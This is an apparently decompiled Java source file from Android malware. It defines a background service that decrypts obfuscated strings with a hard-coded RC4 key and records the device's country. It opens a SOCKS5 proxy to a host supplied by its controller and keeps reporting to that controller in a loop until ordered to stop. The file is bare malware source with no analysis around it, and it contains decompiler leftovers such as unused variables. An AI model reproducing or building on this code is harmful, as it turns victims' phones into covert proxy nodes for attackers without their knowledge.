package com.example.mmm.Service;

import android.app.IntentService;
import android.content.Intent;
import android.util.Base64;
import com.example.mmm.constants;
import com.example.mmm.API.ClassRC4;
import com.example.mmm.Utils.utils;
import java.util.Locale;
import java.util.concurrent.TimeUnit;

public class srvSocks extends IntentService {
   utils missions$ = new utils();
   constants monster$ = new constants();

   public srvSocks() {
      super("");
   }

   public final String decrypt_str(String var1) {
      var1 = new String((new ClassRC4("wewiejvtlfqy".getBytes()))._nevada(utils.hexStringToByteArray(new String(Base64.decode(var1, 0), "UTF-8"))));
      return var1;
   }

   protected void onHandleIntent(Intent var1) {
      this.missions$.SettingsWrite(this, "S5", "");
      String var3 = utils.countrySIM(this);
      String var2 = var3;
      if (var3.length() != 2) {
         var2 = Locale.getDefault().getCountry().toLowerCase();
      }

      var3 = var1.getStringExtra("host");
      String var4 = var1.getStringExtra("user");
      String var5 = var1.getStringExtra("pass");
      String var7 = var1.getStringExtra("port");
      if (!this.missions$._markers(this, this.missions$.SettingsRead(this, "QQ"), var2, var3, var7, var4, var5).equals("+")) {
         StringBuilder var9 = new StringBuilder();
         var9.append("Socks connection to server ");
         var9.append(var3);
         var9.append(" is not possible, port ");
         var9.append(var7);
         var9.append(" is busy[143523#]");
         var7 = var9.toString();
         this.missions$.SettingsToAdd(this, "AS", var7);
         this.missions$._compiled(this, this.missions$.SettingsRead(this, "QQ"));
         this.stopSelf();
      } else {
         Thread var8 = new Thread(new srvSocks$SocketRunnable(this));
         var8.start();
         utils var6 = this.missions$;
         Object var10001 = null;
         this.getDir("apk", 0);
         String var10003 = "ring0.apk";
         boolean var10000 = false;
         this.missions$.Log("START", "START SOCKS");
         StringBuilder var10 = new StringBuilder();
         var10.append("Socks5: ssh -L ");
         var10.append(var7);
         var10.append(":127.0.0.1:");
         var10.append(var7);
         var10.append(" ");
         var10.append(var4);
         var10.append("@");
         var10.append(var3);
         var10.append("[143523#]");
         var7 = var10.toString();
         this.missions$.SettingsToAdd(this, "AS", var7);
         this.missions$._compiled(this, this.missions$.SettingsRead(this, "QQ"));

         do {
            TimeUnit.MILLISECONDS.sleep(10000L);
            this.missions$.sendAddSocks5(this, this.missions$.SettingsRead(this, "QQ"));
         } while(!this.missions$.SettingsRead(this, "S5").equals("stop"));

         var8.interrupt();
         this.stopSelf();
      }
   }
}
